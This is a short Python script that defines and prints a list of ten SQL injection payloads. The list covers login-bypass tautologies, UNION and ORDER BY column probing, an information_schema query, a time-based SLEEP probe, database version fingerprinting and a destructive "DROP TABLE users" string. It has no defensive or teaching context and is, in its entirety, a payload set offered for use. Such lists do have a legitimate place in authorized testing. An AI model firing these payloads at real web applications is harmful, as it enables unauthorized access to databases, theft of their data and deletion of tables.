# ============================================
# SIMPLE SQL INJECTION PAYLOADS
# ============================================
def generate_sql_payloads():
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "'; DROP TABLE users;--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' ORDER BY 1--",
        "' ORDER BY 100--",
        "1' AND SLEEP(5)#",
        "' OR SUBSTRING(@@version,1,1)='5'--"
    ]
    
    print("SQL Injection Payloads:")
    for i, payload in enumerate(payloads, 1):
        print(f"{i:2d}. {payload}")
    
    return payloads

# Usage
# generate_sql_payloads()